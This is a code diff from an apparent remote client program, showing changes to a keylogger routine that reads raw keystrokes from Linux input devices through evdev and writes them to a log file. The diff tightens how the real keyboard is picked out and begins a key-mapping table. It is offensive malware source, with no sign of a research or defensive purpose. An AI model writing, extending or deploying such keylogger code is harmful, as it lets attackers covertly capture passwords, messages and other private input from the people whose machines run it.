@@ -20,7 +20,7 @@ import threading
 import inotify
 import evdev
 import select
-from evdev import ecodes
+from evdev import InputDevice, ecodes, list_devices
 from datetime import datetime
 
 from raw_socket_protocol import RawSocketProtocol
@@ -485,20 +485,25 @@ class Client:
             log_file = "./keylogger.txt"
 
             def run_keylogger():
-                devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
+                devices = [InputDevice(path) for path in list_devices()]
                 keyboard_dev = None
+
                 for dev in devices:
                     caps = dev.capabilities()
+
                     if ecodes.EV_KEY in caps:
-                        keyboard_dev = dev
-                        break
+                        keys = caps[ecodes.EV_KEY]
+
+                        # Require real keyboard keys
+                        if ecodes.KEY_A in keys and ecodes.KEY_ENTER in keys:
+                            keyboard_dev = dev
+                            break
 
                 if keyboard_dev is None:
                     print("[!] Keylogger: no keyboard device found")
-                    return
+                    exit()
 
                 print(f"[*] Keylogger using device: {keyboard_dev.name} ({keyboard_dev.path})")
-
                 KEYMAP = {
                     ecodes.KEY_A: ('a', 'A'), ecodes.KEY_B: ('b', 'B'),
                     ecodes.KEY_C: ('c', 'C'), ecodes.KEY_D: ('d', 'D'),
